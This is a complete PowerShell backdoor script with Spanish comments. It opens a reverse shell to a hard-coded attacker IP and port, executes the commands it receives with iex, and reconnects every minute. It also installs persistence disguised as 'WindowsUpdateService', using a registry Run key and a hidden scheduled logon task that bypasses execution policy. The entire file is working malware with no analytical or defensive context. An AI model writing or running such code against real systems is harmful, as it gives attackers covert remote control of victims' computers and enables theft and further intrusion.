# Configuración
$attackerIP = "192.168.2.36"
$attackerPort = "4444"
$scriptPath = "C:\Users\Public\WindowsUpdate.ps1"
$serviceName = "WindowsUpdateService"
$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Determinar la ruta real del script
$scriptPath = $MyInvocation.MyCommand.Path
if ([string]::IsNullOrEmpty($scriptPath)) {
    $scriptPath = "$env:TEMP\update.ps1"
}

# Función para establecer conexión
function Connect-Backdoor {
    param($IP, $Port)
    
    try {
        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
        $stream = $client.GetStream()
        
        [byte[]]$bytes = 0..65535|%{0}
        
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + "PS " + (pwd).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    }
    catch {
        Start-Sleep -Seconds 60
    }
}

# Función para instalar persistencia
function Install-Persistence {
    # Obtener la ruta real del script actual
    $currentScript = $MyInvocation.MyCommand.Path
    if ([string]::IsNullOrEmpty($currentScript)) {
        $currentScript = "$env:TEMP\temp.ps1"
        # Si se ejecutó desde pipe, crear una copia en TEMP
        Set-Content -Path $currentScript -Value (Get-Content $MyInvocation.Line) -Force
    }
    
    if (-not (Test-Path $scriptPath)) {
        # Copiar el script a una ubicación permanente
        try {
            Copy-Item -Path $currentScript -Destination $scriptPath -Force
        }
        catch {
            Write-Host "Error al copiar: $_"
            return
        }
        
        # Añadir al registro (no requiere admin)
        try {
            Set-ItemProperty -Path $regKey -Name $serviceName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
            Write-Host "Persistencia de registro instalada exitosamente"
        }
        catch {
            Write-Host "Error al instalar persistencia de registro: $_"
        }
        
        # Crear tarea programada (sin nivel más alto)
        try {
            $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
            $trigger = New-ScheduledTaskTrigger -AtLogon -User "$env:USERNAME"
            $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType S4U -RunLevel Highest
            Register-ScheduledTask -TaskName $serviceName -Trigger $trigger -Action $action -Principal $principal -Force -User "$env:USERNAME"
            Write-Host "Tarea programada creada exitosamente"
        }
        catch {
            Write-Host "Error al crear tarea programada: $_ - Intentando método alternativo..."
            # Intentar sin nivel más alto
            try {
                $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
                $trigger = New-ScheduledTaskTrigger -AtLogon -User "$env:USERNAME"
                Register-ScheduledTask -TaskName $serviceName -Trigger $trigger -Action $action -Force -User "$env:USERNAME"
                Write-Host "Tarea programada creada sin privilegios elevados"
            }
            catch {
                Write-Host "No se pudo crear la tarea programada"
            }
        }
    }
}

# Instalar persistencia
Install-Persistence

# Bucle principal
while ($true) {
    Write-Host "[$(Get-Date)] Conectando..."
    Connect-Backdoor -IP $attackerIP -Port $attackerPort
    Start-Sleep -Seconds 60
}
